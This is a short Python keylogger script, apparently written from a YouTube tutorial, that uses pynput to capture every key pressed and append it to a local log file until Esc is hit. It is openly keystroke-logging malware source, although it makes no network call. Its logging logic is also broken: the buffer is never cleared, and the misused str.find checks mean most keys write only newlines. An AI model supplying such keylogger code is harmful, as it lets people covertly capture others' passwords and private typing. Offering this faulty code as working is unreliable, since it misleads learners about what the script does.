# with the help of a tutorial made by Tech with Tim on youtube
import pynput
# Listener is what is going to listen to a key event
from pynput.keyboard import Key, Listener
i = 0
keys = []
def typed(key):
    global keys, i
    keys.append(key)
    i += 1
    if i>10:
        writeOnFile(keys)


def writeOnFile(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space"):
                f.write("\n")
            elif not k.find("Key"):
                f.write(k)

def released(key):
    if key==Key.esc:
        return False
with Listener(on_press=typed, on_release=released) as listener:
    listener.join()